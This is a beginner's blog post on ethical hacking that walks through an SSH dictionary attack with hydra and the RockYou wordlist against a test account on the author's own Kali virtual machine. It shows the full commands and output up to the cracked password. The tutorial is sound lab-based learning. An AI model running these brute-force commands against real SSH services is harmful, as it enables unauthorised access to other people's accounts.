---
title: Introduction to Ethical Hacking
date: 2023-03-26 18:28:17 +03:00
tags: [introduction, "ethical hacking", hacking, kali, linux, "brute-force attack"]
description: This blog post will introduce ethical hacking with Kali Linux. We'll define ethical hacking, discuss Kali Linux, and cover basic techniques such as reconnaissance and vulnerability scanning. By the end, readers will have a better understanding of using Kali Linux as a tool in ethical hacking.
image: /ethical-hacking-intro/ethical-hacking-intro-cover.png
---

# Ethical Hacking

In this series of blog posts, let me walk you through a path of a beginning
ethical hacker. It's mainly meant for me to learn, but I will be happy if this
helps someone else to get down on the path of an ethical hacker as well.

## Kali Linux

Kali Linux is a Linux distribution that comes with a set of tools useful for
ethical hacking. Go ahead and install it, preferably in a virtual machine.

Follow the [official website][1] to install the Kali Linux.

[1]: https://www.kali.org/

## SSH Brute-Force Dictionary Attack

Brute-force attach is the kind of attach where the attacker tries all possible values to crack for
example some password. In this introduction we will create a Linux user account that we will try to
hack.

Instead of trying manually one password after another, let's automate that process. We will create a
list of possible passwords and pass that list to a smart program that will try all those passwords
for us.

On Kali Linux there is a program called `hydra`. Kali Linux also comes with a
list of possible passwords - [RockYou list][2] (comes from the incident in 2009).
The file is located in `/usr/share/wordlists/rockyou.txt.gz` and contains 14
million records. We will use this list to crack a Linux user account.

First of all unzip the file with passwords (also called a dictionary).

`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

> You can try to find your passwords in the list using `grep`. If you find some
> of them there, then it would be the best to change those immediately.

Now let's use the `hydra` to crack the password. For testing purposes I have
created a new account `dummy` with password `winniethepooh` in my Kali virtual machine.

```bash
sudo useradd --no-create-home --no-user-group dummy`
sudo passwd dummy
````

You will also need to enable SSH to allow incoming connections

`sudo service ssh start`

Next, run the `hydra` to crack the password. This time we are not going to crack
the username, instead we will pass the username to `hydra` manually to simplify
and speed up the process.

`hydra -l "dummy" -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`

This might take a while, because Linux is trying to slow potential attacker
down by adding extra timeout when logging in over SSH. After couple moments you
get the first output with statistics:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l dummy -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret
service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and
ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-26 12:54:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce
the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525
tries per task
[DATA] attacking ssh://127.0.0.1:22/
[STATUS] 114.00 tries/min, 114 tries in 00:01h, 14344286 to do in 2097:08h, 15 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

You can notice in the printout that the current speed is 114 passwords per
minute and the time to finish is 2097 hours (87 days), therefore it might be
better to use smaller dictionary for testing purposes.

I have reduced the dictionary size to 200 records (but included the
`winniethepooh`, to see how it works).

```bash
cat /usr/share/wordlists/rockyou.txt | \
  head -n 100000 | \
  sort --random-sort  | \
  head -n 200 | \
  sed '1s/.*/winniethepooh/' | \
  sort --random-sort > ~/word_list.txt
```

Now it is possible to run `hydra` again with the smaller wordlist. After two
minutes at latest we should crack the password.

`hydra -l dummy -P ~/word_list.txt ssh://127.0.0.1`

After a moment we got the result with correct password.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l dummy -P ~/word_list.txt ssh://127.0.0.1 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-26 13:03:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking ssh://127.0.0.1:22/
[22][ssh] host: 127.0.0.1   login: dummy   password: winniethepooh
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-26 13:05:02
```

Hydra was able to crack the password of the user account: `winniethepooh`.

This was the first introductory blog post about ethical hacking. Thanks for
reading!

[2]: https://en.wikipedia.org/wiki/RockYou